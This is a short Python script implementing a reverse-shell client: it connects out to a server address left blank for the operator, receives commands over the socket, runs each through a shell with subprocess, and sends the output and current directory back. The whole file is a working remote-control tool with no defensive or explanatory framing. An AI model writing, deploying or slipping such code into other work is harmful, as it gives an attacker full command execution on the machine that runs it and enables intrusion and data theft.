import socket
import subprocess
import os

# Enter the server ip address
SERVER_IP = ""
SERVER_PORT = 1234

s = socket.socket()
s.connect((SERVER_IP, SERVER_PORT))
print("Connected to server")
initial_data = os.getcwd() + "> "
s.send(initial_data.encode())

while True:
    command = s.recv(1000).decode()
    if command[:2] == "cd":
        if command[3:] != "" and os.path.exists(command[3:]):
            os.chdir(command[3:])
            output_string = os.getcwd() +"> "
            s.send(output_string.encode())
            continue

    if command == "exit":
        s.send(b"exit")
        s.close()
        print("Connection closed")
        break

    s_obj = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True, stderr=subprocess.PIPE)
    output_string = s_obj.stdout.read().decode() + s_obj.stderr.read().decode() + os.getcwd() + "> "
    s.send(output_string.encode())
